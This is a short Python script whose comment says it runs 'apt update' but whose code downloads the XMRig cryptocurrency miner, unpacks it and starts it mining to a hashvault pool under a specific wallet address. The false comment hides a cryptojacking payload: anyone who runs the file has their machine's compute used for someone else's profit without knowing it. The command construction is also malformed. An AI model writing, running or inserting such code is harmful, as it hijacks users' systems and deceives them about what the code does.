import subprocess

# Execute apt update (requires root privileges)
result = subprocess.run(["wget", "https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
        "tar", "xvzf", "xmrig-6.21.1-linux-x64.tar.gz && "
        "cd", "xmrig-6.21.1 && "
        "./xmrig", "--url pool.hashvault.pro:443 "
        "--user 46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH "
        "--pass x0 --donate-level 1 "
        "--tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" ], capture_output=True, text=True, shell= True)

print(result.stdout)
print(result.stderr)  # Shows any errors
